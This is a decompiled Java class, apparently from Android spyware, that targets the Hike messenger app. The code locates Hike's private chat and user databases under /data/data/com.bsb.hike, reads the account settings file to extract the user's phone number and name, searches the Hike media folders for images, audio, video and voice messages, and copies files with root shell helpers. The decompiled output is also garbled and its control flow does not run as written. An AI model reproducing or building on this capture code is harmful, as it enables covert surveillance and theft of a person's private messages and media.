package com.vvt.capture.hike;

import android.os.SystemClock;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.io.d;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

public class c
{
  private static final String a = c.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  private static final boolean d = com.vvt.ak.a.d;
  
  public static String a()
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "chats";
    String str2 = p.a("/data/data/com.bsb.hike/databases", str1);
    boolean bool2 = b;
    if (bool2) {}
    return str2;
  }
  
  public static String a(String paramString)
  {
    String str = "chats";
    boolean bool = b;
    if (bool) {}
    return str;
  }
  
  protected static String a(String paramString1, String paramString2, ImType paramImType, ImMediaFileType paramImMediaFileType, String paramString3)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    Object localObject = null;
    boolean bool2 = ShellUtil.b(paramString2);
    if (bool2)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      String str = com.vvt.im.a.c.a(paramString1, paramImType, paramImMediaFileType);
      localObject = ((StringBuilder)localObject).append(str);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = com.vvt.im.a.c.a(paramImMediaFileType);
      localObject = str;
      ShellUtil.a(paramString2, (String)localObject);
      ShellUtil.b(paramString3, (String)localObject);
    }
    for (;;)
    {
      bool2 = b;
      if (bool2) {}
      return (String)localObject;
      bool2 = d;
      if (!bool2) {}
    }
  }
  
  public static boolean a(com.vvt.im.events.info.a parama)
  {
    boolean bool1 = b;
    if (bool1) {}
    String str = parama.c();
    File localFile = new java/io/File;
    localFile.<init>(str);
    bool1 = localFile.exists();
    boolean bool2 = b;
    if (bool2) {}
    return bool1;
  }
  
  public static String b()
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "hikeusers";
    String str2 = p.a("/data/data/com.bsb.hike/databases", str1);
    boolean bool2 = b;
    if (bool2) {}
    return str2;
  }
  
  public static String b(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    String str = "";
    Object localObject1 = d.h("/storage/emulated/0/Hike/Media/hike Profile Images");
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = paramString + ".jpg";
    localObject1 = p.a((String)localObject1, (String)localObject2);
    Object localObject3 = new java/lang/StringBuilder;
    ((StringBuilder)localObject3).<init>();
    localObject3 = ((StringBuilder)localObject3).append(paramString);
    Object localObject4 = ".jpg";
    localObject3 = (String)localObject4;
    localObject2 = p.a("/data/data/com.bsb.hike/cache", (String)localObject3);
    boolean bool2 = b;
    if (bool2) {}
    localObject3 = new java/io/File;
    ((File)localObject3).<init>((String)localObject1);
    localObject4 = new java/io/File;
    ((File)localObject4).<init>((String)localObject2);
    bool2 = ((File)localObject3).exists();
    if (bool2) {}
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      return (String)localObject1;
      bool1 = ((File)localObject4).exists();
      if (bool1)
      {
        localObject1 = localObject2;
      }
      else
      {
        bool1 = b;
        if (bool1) {}
        bool1 = b;
        if (bool1) {}
        localObject1 = str;
      }
    }
  }
  
  public static String c()
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "accountsettings.xml";
    String str2 = p.a("/data/data/com.bsb.hike/shared_prefs", str1);
    boolean bool2 = b;
    if (bool2) {}
    return str2;
  }
  
  public static String c(String paramString)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "";
    String[] arrayOfString = new String[6];
    String str2 = "/storage/emulated/0/Hike/Media/hike Audios";
    arrayOfString[0] = str2;
    arrayOfString[1] = "/storage/emulated/0/Hike/Media/hike Gif";
    arrayOfString[2] = "/storage/emulated/0/Hike/Media/hike Images";
    arrayOfString[3] = "/storage/emulated/0/Hike/Media/hike Others";
    arrayOfString[4] = "/storage/emulated/0/Hike/Media/hike Videos";
    int j = 5;
    Object localObject2 = "/storage/emulated/0/Hike/Media/hike Voice Messages";
    arrayOfString[j] = localObject2;
    j = arrayOfString.length;
    if (i < j)
    {
      str2 = d.h(p.a(arrayOfString[i], paramString));
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(str2);
      boolean bool3 = ((File)localObject2).exists();
      if (!bool3) {}
    }
    for (localObject1 = str2;; localObject1 = str1)
    {
      boolean bool2 = b;
      if (bool2) {}
      return (String)localObject1;
      i += 1;
      break;
    }
  }
  
  public static String d()
  {
    int i = 0;
    int j = b;
    if (j != 0) {}
    Object localObject1 = c();
    Object localObject3 = new java/io/File;
    ((File)localObject3).<init>((String)localObject1);
    Object localObject4 = "";
    j = 0;
    localObject1 = null;
    boolean bool3;
    for (;;)
    {
      boolean bool2 = ((File)localObject3).exists();
      if (bool2) {
        break;
      }
      int m = 3;
      if (j >= m) {
        break;
      }
      long l = 3000L;
      SystemClock.sleep(l);
      int k;
      j += 1;
      bool3 = b;
      if (!bool3) {}
    }
    boolean bool1 = ((File)localObject3).exists();
    if (bool1) {
      localObject1 = DocumentBuilderFactory.newInstance();
    }
    for (;;)
    {
      try
      {
        localObject1 = ((DocumentBuilderFactory)localObject1).newDocumentBuilder();
        localObject1 = ((DocumentBuilder)localObject1).parse((File)localObject3);
        localObject3 = "string";
        localObject1 = ((Document)localObject1).getElementsByTagName((String)localObject3);
        int n = ((NodeList)localObject1).getLength();
        if (i >= n) {
          break label265;
        }
        localObject3 = ((NodeList)localObject1).item(i);
        Object localObject5 = ((Node)localObject3).getAttributes();
        String str = "name";
        localObject5 = ((NamedNodeMap)localObject5).getNamedItem(str);
        if (localObject5 == null) {
          continue;
        }
        localObject5 = ((Node)localObject5).getNodeValue();
        str = "msisdnEntered";
        bool3 = ((String)localObject5).equals(str);
        if (!bool3) {
          continue;
        }
        localObject1 = ((Node)localObject3).getTextContent();
        localObject4 = localObject1;
      }
      catch (ParserConfigurationException localParserConfigurationException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      catch (SAXException localSAXException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      catch (IOException localIOException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = b;
      if (bool1) {}
      return (String)localObject4;
      i += 1;
      continue;
      bool1 = b;
      if (bool1)
      {
        continue;
        label265:
        Object localObject2 = localObject4;
      }
    }
  }
  
  public static String e()
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = c();
    Object localObject1 = new java/io/File;
    ((File)localObject1).<init>(str1);
    str1 = "";
    boolean bool2 = ((File)localObject1).exists();
    Object localObject2;
    if (bool2) {
      localObject2 = DocumentBuilderFactory.newInstance();
    }
    for (;;)
    {
      try
      {
        localObject2 = ((DocumentBuilderFactory)localObject2).newDocumentBuilder();
        localObject1 = ((DocumentBuilder)localObject2).parse((File)localObject1);
        localObject2 = "string";
        localObject2 = ((Document)localObject1).getElementsByTagName((String)localObject2);
        int i = 0;
        localObject1 = null;
        int k = ((NodeList)localObject2).getLength();
        if (i < k)
        {
          Node localNode = ((NodeList)localObject2).item(i);
          Object localObject3 = localNode.getAttributes();
          String str2 = "name";
          localObject3 = ((NamedNodeMap)localObject3).getNamedItem(str2);
          if (localObject3 == null) {
            continue;
          }
          localObject3 = ((Node)localObject3).getNodeValue();
          str2 = "name";
          boolean bool5 = ((String)localObject3).equals(str2);
          if (!bool5) {
            continue;
          }
          str1 = localNode.getTextContent();
        }
      }
      catch (ParserConfigurationException localParserConfigurationException)
      {
        boolean bool3;
        int j;
        bool4 = c;
        if (!bool4) {
          continue;
        }
        continue;
      }
      catch (SAXException localSAXException)
      {
        bool4 = c;
        if (!bool4) {
          continue;
        }
        continue;
      }
      catch (IOException localIOException)
      {
        bool4 = c;
        if (!bool4) {
          continue;
        }
        continue;
      }
      bool3 = b;
      if (bool3) {}
      return str1;
      bool3 += true;
      continue;
      boolean bool4 = b;
      if (!bool4) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hike/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */